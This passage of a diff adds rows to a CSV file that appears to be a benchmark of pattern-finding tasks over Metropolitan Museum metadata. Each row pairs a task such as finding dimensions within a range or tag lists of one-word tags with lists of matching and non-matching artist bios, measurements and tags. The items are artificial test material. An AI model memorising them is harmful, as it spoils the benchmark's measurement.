+Italian, 1460-1500
+German, 1730-1775|German, 1762-1800
+French, 1808-1879|French, 1762-1841
+Italian, 1510-1532|Italian, 1568-1590
+British, 1690-1756|British, 1683-1746|French, 1699-1773|Dutch, 1563-1640","Japanese, 1761-1816
+American, 1825-1857 New York
+American, 1810-1891|American (born German) 1832-1932|American, 1857-1907|American, 1809-1865|American, 1811-1872
+American, 1850-70
+Japanese, born 1945
+American, 1864-1949
+American, 1856-1860|American, 1856-1860
+American, 1917-2009|French, 1869-1936
+American, 1783-1872|American (born London, England) 1808-1897
+Japanese, 1778-1857 Edo|Japanese, active 19th century|Japanese, Edo period, 19th century",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+45,,met,Artist Display Bio,"Find the string of the format <country>, optional <city> <year>","Dutch, 1654-1693
+British, London 1620-1691
+Swiss, Borgonovo 1901-1966|Swiss, Borgonovo 1902-1985","1934|French, 1858-1956
+British, London 1757-1827 London|1794-1829|British, London 1765-1809 
+|American, 1912","Austrian, 1760-1830
+American, 1897-1921
+French, Paris 1730-1805
+German, Augsburg, 1513-40|German, Kaufbeuren 1471-1536|German, Eisleben 1483-1546
+German, 1834-1925
+German, Nuremberg 1586-1632
+French, Paris 1837-1880|Italian, Caprese 1475-1564
+German, 1879-1951|German, 1839-1903|French, Abbeville 1703-1763
+Netherlandish, 1540-1577
+French, Paris 1831-1905|French, 1810-1887","Danish, 1775-present|Danish, Copenhagen, Denmark, 1889-1961, Frederiksburg, Denmark
+Flemish, Siegen 1577-1640 Antwerp|Netherlandish, Antwerp 1570-Antwerp 1634
+British, Daresbury, Cheshire 1832-1898 Guildford|British, London 1820-1914 London| |British, active 1839-93|London
+ |Chicago, Illinois
+French, Paris 1578-1637 Paris|French (born Flanders), Antwerp 1564-1641 Paris|French, baptized Chartres, 1588-1647 Paris
+American, 1874-1911| |New York, NY|active New York, early 20th century|American, New York 1867-1944 New York
+Italian, active France, 1840s-60s
+Italian, Rome 1627-1691 Rome|Italian, Parma 1582-1647 Rome|Italian, Marsala, Sicily 1650-1692/1700 Rome
+French, ca. 1845-1917|French, Algiers 1865-1953 Le Vésinet
+French, Paris 1743-after 1810",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+46,,met,Dimensions,Find dimension within certain range (10-50),"15 1/4 x 20 3/4 x 15 1/4 in. (38.7 x 52.7 x 38.7 cm)
+44 1/4 x 30 x 11 1/4 in. (112.4 x 76.2 x 28.6 cm)
+28 3/4 x 48 3/4 x 35 3/4 in. (73 x 123.8 x 90.8 cm)","29 1/2 x 66 x 39 1/2 in. (74.9 x 167.6 x 100.3 cm)
+3 1/8 x 2 7/8 x 1 1/2 in. (7.9 x 7.3 x 3.8 cm)
+65 x 69 3/4 x 1 3/4 in. (165.1 x 177.2 x 4.4 cm)","49 x 24 x 12 in. (124.5 x 61 x 30.5 cm)
+49 3/4 x 44 1/2 x 24 1/2 in. (126.4 x 113 x 62.2 cm)
+31 x 23 x 14 in. (78.7 x 58.4 x 35.6 cm)
+32 1/2 x 41 3/4 x 15 1/4 in. (82.6 x 106 x 38.7 cm)
+49 x 24 x 12 in. (124.5 x 61 x 30.5 cm)
+16 1/4 x 44 3/4 x 14 in. (41.3 x 113.7 x 35.6 cm)
+33 1/8 x 20 3/8 x 16 3/4 in. (84.1 x 51.8 x 42.5 cm)
+30 1/4 x 14 1/2 x 14 1/2 in. (76.8 x 36.8 x 36.8 cm)
+15 3/8 x 14 7/8 x 14 7/8 in. (39.1 x 37.8 x 37.8 cm)
+39 1/2 x 48 x 21 1/2 in. (100.3 x 121.9 x 54.6 cm)","34 x 84 3/4 x 23 3/4 in. (86.4 x 215.3 x 60.3 cm)
+11 3/4 x 55 3/4 x 1 7/8 in. (29.8 x 141.6 x 4.8 cm)
+48 1/2 x 89 3/4 x 29 1/2 in. (123.2 x 228 x 74.9 cm)
+2 1/2 x 3 x 3 in. (6.4 x 7.6 x 7.6 cm)
+L. 17 3/4 x W. 17 inches; 45.1 x 43.2 cm
+8-9/16 x 13-1/2 in.  (21.7 x 34.3 cm)
+Image: 23.5 x 33.2 cm (9 1/4 x 13 1/16 in.)
+Sheet: 5 5/8 × 9 3/16 in. (14.3 × 23.3 cm)
+Sheet: 5 1/2 × 7 7/8 in. (14 × 20 cm)
+41 x 55 1/2 x 30 in. (104.1 x 141 x 76.2 cm)
+Overall (weight on pallet): 51 15/16 × 24 × 17 11/16 in., 636 lb. (132 × 61 × 45 cm, 288.4877kg)
+Overall: 9 1/16 x 6 1/2 x 7/8 in. (23 x 16.5 x 2.2 cm)
+L. 34 x W. 12 inches",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+47,,met,Dimensions,Find dimension with height greater than 10 that contains H.,"H. 24 1/2 x W. 3 1/8 x D. 3 5/8 in. (62.2 x 7.9 x 9.2 cm)
+H. 12 3/4 in. (32.4 cm); Diam. 6 1/16 in. (15.4 cm)
+H. 12 1/4 in. (31.1 cm)","H. 5 1/4 in. (13.3 cm)
+6 9/16 x 4 1/2 in. (16.7 x 11.4 cm)
+H. 9 5/8 in. (24.4 cm); Diam. 6 1/16 in. (15.4 cm)","H. 24 1/2 x W. 3 1/8 x D. 3 5/8 in. (62.2 x 7.9 x 9.2 cm)
+H. 10 1/2 in. (26.7 cm); W. 10 1/2 in. (26.7 cm)
+H. with scabbard 26 in. (66 cm);  W. 3 3/4 in. (9.5 cm)
+H. 27 in. (68.6 cm); W. 10 1/4 in. (26 cm); D. 5 3/8 in. (13.7 cm)
+H. 34 1/8 x Diam. 4 9/16 in. (86.7 x 11.5 cm)
+H. 12 1/4 in. (31.1 cm); W. 4 3/4 in. (12.1 cm); D. 10 in. (25.4 cm)
+H. 76 15/16 in. (195.5 cm)
+H. 23 x W. 27 in. (58.4 x 68.6 cm)
+H. 15 1/4 in. (38.7 cm); W. 10 1/2 in. (26.7 cm)
+H. 78.5 x W. 81 cm (30 7/8 x 31 7/8 in.)","23.6 x 18.7 cm (9 5/16 x 7 3/8 in. )
+Sheet: 11 5/8 × 17 3/4 in. (29.5 × 45.1 cm)
+Image: 13 13/16 × 9 3/4 in. (35.1 × 24.7 cm); Sheet: 16 × 12 in. (40.6 × 30.5 cm)
+h. 2.7 cm (1 1/16 in)
+Gr. H. 1 7/16 in. (3.6 cm); L. 2 7/16 in. (6.2 cm); Depth 1 9/16 in. (4.0 cm); Th. at rim 5/32 in. (0.35 cm)
+image: 19 x 13 in. (48.3 x 33 cm) sheet: 22 3/4 x 16 in. (57.8 x 40.6 cm)
+Diam. 22.4 cm (8 13/16 in.)
+Amulet: L. 1.2 cm (1/2 in.)
+sheet: 23 3/8 x 18 5/16 in. (59.4 x 46.5 cm)
+L. 6 1/2 x W. 4 inches (16.5 x 10.2 cm)
+Mount: 20 3/8 × 14 9/16 in. (51.8 × 37 cm); Sheet: 13 9/16 × 9 3/4 in. (34.5 × 24.8 cm)
+Sheet (trimmed): 11 3/8 × 8 1/4 in. (28.9 × 21 cm)
+Overall: 10 7/8 x 11 1/16 in. (27.6 x 28.1 cm)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+48,,met,Dimensions,Find dimension with height less than 10 and Diam less than 10,"H. 10 in. (25.4 cm); Diam. 6 3/4 in. (17.1 cm)
+H. 3 1/2 in. (8.9 cm); Diam. 9 in. (22.9 cm)
+H. 6 in. (15.2 cm); Diam. 4 3/8 in. (11.1 cm)","H. 1 in. (2.5 cm); Diam. 10 1/4 in. (26 cm)
+H. 16 1/4 in. (41.3 cm); Diam. 9 in. (22.9 cm)
+H. 17 1/2 in. (44.5 cm); Diam. 16 15/16 in. (43 cm)","H. 5/6 in. (2.1 cm); Diam. 4 5/6 in. (12.3 cm)
+H. 5 5/8 in. (14.3 cm); Diam. 4 in. (10.2 cm)
+H. 3 5/8 in. (9.2 cm); Diam. 8 1/4 in. (21 cm)
+H. 3/4 in. (1.9 cm); Diam. 7/8 in. (2.2 cm)
+H. 9 3/4 in. (24.8 cm); Diam. 8 5/8 in. (21.9 cm)
+H. 4 7/8 in. (12.4 cm); L. 16 5/8 in. (42.2 cm) Diam. 6 3/4 in (17.1 cm)
+H. 2 3/4 in. (7 cm); Diam. 1 5/6 in. (4.6 cm)
+H. 7/8 in. (2.3 cm); Diam. 9/16 in. (1.4 cm)
+H. 4 in. (10.2 cm); Diam. 4 5/8 in. (11.7 cm)
+H. 4 1/2 in. (11.43 cm); Diam. 7 1/4 in. (18.42 cm)","Diam. 9 13/16 in. (24.9 cm)
+1 5/16 x 2 7/16 x 2 1/16 in. (3.4 x 6.2 x 5.2 cm)
+11 3/4 x 8 9/16in. (29.9 x 21.8cm)
+10 3/8 × 17 1/4 in. (26.4 × 43.8 cm);
+5 3/4 × 3 1/8 in. (14.6 × 7.9 cm)
+5 3/4 × 3 1/8 in. (14.6 × 7.9 cm)
+14.3 x 19.9 cm. (5  5/8  x 7  13/16  in.)
+H. 24.8 cm (9 3/4 in); W. 24.8 cm (9 3/4 in)
+4 3/8 x 9 in. (11.1 x 22.9 cm)
+33.1 x 23.3 cm. (13  x 9  3/16  in.)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+49,,met,Tags,At least 3 tags,"Men|Spectators|Gambling|Roosters|Dogs|Coat of Arms
+Men|Cross|Emblems
+Swords|Men|Male Nudes|Owls","Women|Shunga
+Doors|Flags
+Cybele|Lions","Buildings|Stairs|Courtyards
+Women|Trees|Hammers
+Interiors|Dogs|Crowd|Dining|Coat of Arms
+Birds|Flowers|Roses
+Girls|Carriages|Portraits
+Books|Fountains|Trees|Human Figures
+Flowers|Plants|Chests
+Paris|Streets|Cities
+Portraits|Tea|Women|Working
+Women|Dancing|Dancers|Ballet","Still Life|Playing Cards
+Men|Pigs
+Male Nudes|Streams
+Men|Wreaths
+Flowers|Couches
+Bacchantes|Fauns
+Cross|Landscapes
+Heads|Shells
+Male Nudes|Shepherds
+Cross|Saints",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+50,,met,Tags,Find those tags such that every tag is one word,"Boats|Popes|Saints
+Satire|Cows
+Buildings|Children|Men|Women|Markets","Animals|Men|Coat of Arms|Flags
+Men|Death|Skulls|Horse Riding|Dogs|Devil|Knights|Armor|Weapons
+Male Nudes|Eve","Leaves|Cups
+Shields|Men|Battles
+Helmets|Men|Portraits
+Men|Portraits|Mountains
+Elephants|Horses|Lions|Shunga
+Corpses|Fires|Crowd
+Monsters|Gandhara
+Prisons|Towers
+Noah|Men|Fire
+Boys|Goddess","Warriors|Shields|Men|Women|Horse Riding
+Mountains|Landscapes|Human Figures
+Musical Instruments|Costumes|Women|Musicians
+Men|Women|Mythical Creatures
+Men|Saint John the Baptist|Women|Salome|Beds
+Men|Horse Riding|Battles
+Men|Female Nudes|Galatea|Pygmalion
+Bridges|Coat of Arms
+Palaces|Interiors|Armor|Mary Queen of Scots
+Men|Horse Riding|Agriculture
+Battles|Soldiers|Weapons|Men|Horse Riding",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
